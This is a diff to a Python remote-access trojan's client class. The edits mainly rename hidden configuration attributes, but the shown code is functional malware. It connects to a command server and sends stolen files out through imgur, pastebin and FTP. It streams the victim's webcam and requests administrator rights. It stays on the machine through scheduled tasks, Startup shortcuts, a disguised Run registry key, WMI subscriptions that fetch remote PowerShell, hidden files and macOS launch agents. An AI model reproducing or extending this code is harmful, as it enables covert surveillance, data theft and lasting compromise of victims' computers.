@@ -173,10 +173,10 @@ class Client(object):
 
     def _target(self, **kwargs):
         try:
-            ab = request('GET', long_to_bytes(long(self.a)), headers={'API-Key': long_to_bytes(long(self.b))}).json() 
+            ab = request('GET', long_to_bytes(long(self.__a__)), headers={'API-Key': long_to_bytes(long(self.__b__))}).json() 
             return ab[ab.keys()[0]][0].get('ip')
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Target error: {}'.format(str(e))
     
     def _connect(self, host='localhost', port=1337):
@@ -186,7 +186,7 @@ class Client(object):
             s.connect((host, port))
             return s
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Connection error: {}'.format(str(e))
             time.sleep(10)
             return self._connect(host, port)
@@ -203,7 +203,7 @@ class Client(object):
             if len(data):
                 return self._send(data, method)
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Send error: {}'.format(str(e))
 
     def _receive(self):
@@ -217,7 +217,7 @@ class Client(object):
             data = self._decrypt(data.rstrip()) if len(data) else data
             return data
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Receive error: {}'.format(str(e))
 
     def _diffiehellman(self, bits=2048):
@@ -231,7 +231,7 @@ class Client(object):
             x = pow(xB, a, p)
             return SHA256.new(long_to_bytes(x)).digest()
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Diffie-Hellman error: {}'.format(str(e))
 
     def _encrypt(self, plaintext):
@@ -244,7 +244,7 @@ class Client(object):
             output = b64encode(ciphertext + hmac_sha256)
             return output
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Error: {}'.format(str(e))
 
     def _decrypt(self, ciphertext):
@@ -259,7 +259,7 @@ class Client(object):
                 self.logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
             return output.rstrip(b'\0')
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Decryption error: {}'.format(str(e))
 
     def _obfuscate(self, data, encoding=None):
@@ -308,14 +308,14 @@ class Client(object):
                     target = 'remove_{}_{}_persistence'.format(*method.split())
                     getattr(self, target)()
                 except Exception as e2:
-                    if self.v:
+                    if self.__v__:
                         print 'Remove persistence error: {}'.format(str(e2))
             try:
                 self.socket.close()
             except: pass
             try:
-                if self.f:
-                    os.remove(self.f)
+                if self.__f__:
+                    os.remove(self.__f__)
                 elif '__file__' in globals():
                     os.remove(__file__)
                 elif len(sys.argv) >= 1:
@@ -387,9 +387,9 @@ class Client(object):
         info = self._info()
         if info['Admin']:
             return {'User': info['login'], 'Administrator': info['admin']}
-        if self.f:
+        if self.__f__:
             if os.name is 'nt':
-                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.f))))
+                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
             else:
                 return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
 
@@ -418,7 +418,7 @@ class Client(object):
             self.modules[name] = module
             return module
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print "Error creating module: {}".format(str(e))
 
     def _powershell(self, cmdline):
@@ -432,13 +432,13 @@ class Client(object):
             results, _ = p.communicate()
             return results
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Powershell error: {}'.format(str(e))
 
     def _logger(self, port=4321):
         module_logger = getLogger(self._ip())
         module_logger.handlers = []
-        socket_handler = SocketHandler(self._target(o=long(self.a), p=long(self.b)), port)
+        socket_handler = SocketHandler(self._target(o=long(self.__a__), p=long(self.__b__)), port)
         module_logger.addHandler(socket_handler)
         return module_logger
 
@@ -446,16 +446,16 @@ class Client(object):
         with open(filename, 'rb') as fp:
             data = b64encode(fp.read())
         os.remove(filename)
-        result = request('POST', 'https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(long(self.e))}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
+        result = request('POST', 'https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(long(self.__e__))}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
         return result
 
     def _pastebin(self, text):
-        result = request('POST', 'https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(long(self.c)), 'api_user_key': long_to_bytes(long(self.d)), 'api_option': 'paste', 'api_paste_code': text}).content
+        result = request('POST', 'https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(long(self.__c__)), 'api_user_key': long_to_bytes(long(self.__d__)), 'api_option': 'paste', 'api_paste_code': text}).content
         return result
     
     def _ftp(self, filepath):
         try:
-            host = FTP(*long_to_bytes(self.q).split())
+            host = FTP(*long_to_bytes(self.__q__).split())
             if self.info().get('IP Address') not in host.nlst('/htdocs'):
                 host.mkd('/htdocs/{}'.format(self.info().get('IP Address')))
             result = '/htdocs/{}/{}'.format(self.info().get('IP Address'), os.path.basename(filepath))
@@ -510,7 +510,7 @@ class Client(object):
             
     def _start(self):
         try:
-            self.socket  = self._connect(host=self._target(o=self.a, p=self.b))
+            self.socket  = self._connect(host=self._target(o=self.__a__, p=self.__b__))
             self.dhkey   = self._diffiehellman()
             self.threads['thread_handler'] = Thread(target=self._thread_handler, name='thread_handler')
             self.threads['thread_handler'].start()
@@ -522,7 +522,7 @@ class Client(object):
                 else:
                     self.shell()
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print "Error: '{}'".format(str(e))
 
     def _keylogger_event(self, event):
@@ -591,7 +591,7 @@ class Client(object):
     def _webcam_stream(self):
         dev = VideoCapture(0)
         s   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self._target(o=long(self.a), p=long(self.b)), port))
+        s.connect((self._target(o=long(self.__a__), p=long(self.__b__)), port))
         while True:
             ret, frame = dev.read()
             data = pickle.dumps(frame)
@@ -755,40 +755,40 @@ class Client(object):
         return result
 
     def _persistence_add_scheduled_task(self):
-        if self.f:
-            task_run    = long_to_bytes(long(self.f))
+        if self.__f__:
+            task_run    = long_to_bytes(long(self.__f__))
             task_name   = os.path.splitext(os.path.basename(task_run))[0]
             try:
                 if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), shell=True) == 0:
                     return True
             except Exception as e:
-                if self.v:
+                if self.__v__:
                     print 'Add scheduled task error: {}'.format(str(e))
         return False
 
     def _persistence_remove_scheduled_task(self):
-        if self.f:
+        if self.__f__:
             try:
-                task_name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.f))))[0]
+                task_name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.__f__))))[0]
                 if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
                     return True
             except: pass
             return False
 
     def _persistence_add_startup_file(self):
-        if self.f:
+        if self.__f__:
             try:
                 appdata = os.path.expandvars("%AppData%")
                 startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                 if os.path.exists(startup_dir):
                     random_name = str().join([choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(choice(range(6,12)))])
                     persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
-                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % long_to_bytes(long(self.f))
+                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % long_to_bytes(long(self.__f__))
                     with file(persistence_file, 'w') as fp:
                         fp.write(content)
                     return True
             except Exception as e:
-                if self.v:
+                if self.__v__:
                     print 'Adding startup file error: {}'.format(str(e))
         return False
 
@@ -807,13 +807,13 @@ class Client(object):
 
     def _persistence_add_registry_key(self, cmd=None, name='MicrosoftUpdateManager'):
         reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
-        value   = cmd or long_to_bytes(long(self.f))
+        value   = cmd or long_to_bytes(long(self.__f__))
         try:
             SetValueEx(reg_key, name, 0, REG_SZ, value)
             CloseKey(reg_key)
             return True
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Remove registry key error: {}'.format(str(e))
         return False
 
@@ -828,22 +828,22 @@ class Client(object):
 
     def _persistence_add_wmi_object(self, command=None, name='MicrosoftUpdaterManager'):
         try:
-            if self.f:
-                filename = long_to_bytes(long(self.f))
+            if self.__f__:
+                filename = long_to_bytes(long(self.__f__))
                 if not os.path.exists(filename):
                     return 'Error: file not found: {}'.format(filename)
                 cmd_line = filename
             else:
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
             startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-            powershell = request('GET', long_to_bytes(self.s)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
+            powershell = request('GET', long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
             self._powershell(powershell)
             code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
             result = self._powershell(code)
             if name in result:
                 return True
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'WMI persistence error: {}'.format(str(e))
         return False
 
@@ -861,35 +861,35 @@ class Client(object):
 
     def _persistence_add_hidden_file(self):
         try:
-            name = os.path.basename(long_to_bytes(long(self.f)))
+            name = os.path.basename(long_to_bytes(long(self.__f__)))
             if os.name is 'nt':
                 hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
             else:
                 hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
                 if hide:
-                    self.f = bytes_to_long(os.path.join(os.path.dirname('.' + name), '.' + name))
+                    self.__f__ = bytes_to_long(os.path.join(os.path.dirname('.' + name), '.' + name))
             if hide:
                 return True
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Adding hidden file error: {}'.format(str(e))
         return False
 
     def _persistence_remove_hidden_file(self, *args, **kwargs):
         try:
-            return subprocess.call('attrib -h {}'.format(long_to_bytes(long(self.f))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
+            return subprocess.call('attrib -h {}'.format(long_to_bytes(long(self.__f__))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
         except Exception as e:
-            if self.v:
+            if self.__v__:
                 print 'Error unhiding file: {}'.format(str(e))
         return False
             
 
     def _persistence_add_launch_agent(self, name='com.apple.update.manager'):
         try:
-            code    = request('GET', long_to_bytes(self.g)).content
+            code    = request('GET', long_to_bytes(self.__g__)).content
             label   = name
             fpath   = mktemp(suffix='.sh')
-            bash    = code.replace('__LABEL__', label).replace('__FILE__', long_to_bytes(long(self.f)))
+            bash    = code.replace('__LABEL__', label).replace('__FILE__', long_to_bytes(long(self.__f__)))
             fileobj = file(fpath, 'w')
             fileobj.write(bash)
             fileobj.close()
@@ -897,13 +897,13 @@ class Client(object):
             bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
             return True
         except Exception as e2:
-            if self.v:
+            if self.__v__:
                 print 'Error: {}'.format(str(e2))
         return False
 
     def _persistence_remove_launch_agent(self, name=None):
         try:
-            name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.f))))[0]
+            name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.__f__))))[0]
             os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
             return True
         except: pass
@@ -915,7 +915,7 @@ class Client(object):
                 break
             dead_threads = [self.threads.pop(job, None) for job in self.threads if not self.threads[job].is_alive()]
             for dead in dead_threads:
-                if self.v:
+                if self.__v__:
                     print "Thread '{}' killed".format(dead.name)
                 del dead
             time.sleep(5)
